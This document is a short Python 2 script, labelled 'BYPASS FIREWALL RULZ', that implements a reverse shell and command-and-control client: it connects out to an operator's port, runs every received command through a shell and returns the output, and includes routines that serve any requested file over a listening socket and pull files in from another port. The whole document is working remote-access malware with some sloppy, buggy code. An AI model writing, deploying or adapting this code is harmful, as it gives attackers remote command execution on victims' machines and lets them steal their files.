#!/usr/bin/python
####### BYPASS FIREWALL RULZ ######
import time,os,sys,socket,subprocess # import modules

def socketCreate():
    ## set global variables to be accessed across functions ##

        global host
        global port
        global s

        ## create socket ##
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host = '127.0.0.1'
        ## accept port as user_input ##
        port = raw_input('Enter port for connecting')
        # turn port string into an integer #
        port = int(port)
        ## Connect to host and port then send data
        try:
            ## connect to the socket ##
            s.connect((host,port))
            print('CONNECTION_ESTABLISHED')
        #s.send(os.environ['COMPUTERNAME'])
            s.send('got connection from computer')

        except socket.error as msg:
            print('socket exception happened: ' +str(msg[0]))
            print('not connected')

def socketSend():
    ### send data ####
    global term
    ### print port and fall into infinite loop ###
    print('trying to connect to the Command & Control !: %s'%(port))
    while 1:

        term  = s.recv(1024)


        if 'file' in term:

            fileDownload()

        elif term != 'file':
            print 'trying to execute :'+term

    ####### [STANDARD(input, output, error) ...]  #######
            proc2 = subprocess.Popen(term, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout_value = proc2.stdout.read() + proc2.stderr.read()
            args = stdout_value
            send(args)


        ####################################################
def fileDownload():
    import socket
    global s
    global port
    global host
    global data

    s = socket.socket()
    port = 777
    host = '127.0.0.1'
    #s.connect((host,port))
    s.bind((host,port))
    s.listen(5)
    print 'server is listening on host:  %s and port:  %s', (host,port)
    ###########################
    while True:
        pos = 'Busy'
        conn,addr = s.accept()
        conn.send('got connection from')
        data = conn.recv(1024)
        print('receving ', repr(data))

        filename = data
        f = open(filename, 'rb')
        l = f.read(1024)
        while (l):
            conn.send(l)
            print 'sent', repr(l)
            l = f.read(1024)
        pos = 'done sending data'
        conn.send('/r/n')
        if pos == 'done sending data':
            socketCreate()




    #########################################


##############################################################
def fileUpload():
    global s
    global port
    global host
    global data
    s = socket.socket()
    port = 4444
    host = '127.0.0.1'
    s.connect((host,port))

    data = s.recv(1024)
    #s.send(data)
    with open('received_file','wb') as f:
        print 'file opened for reading'
        while True:
            print 'Receiving data'
            data = s.recv(1024)
            print('data=%s', (data))
            if not data:
                break
            f.write(data)
        f.close()
        print('File Download Complete')
        print('connection closing')
        #conn.send('File Download Complete')
        #conn.send('Connection Terminating')


def send(args):
    #### send the output back ####
    print args
    send = s.send(args)
    socketSend()



while True:
    if __name__ == '__main__':
        socketCreate()
        socketSend()
        s.close()

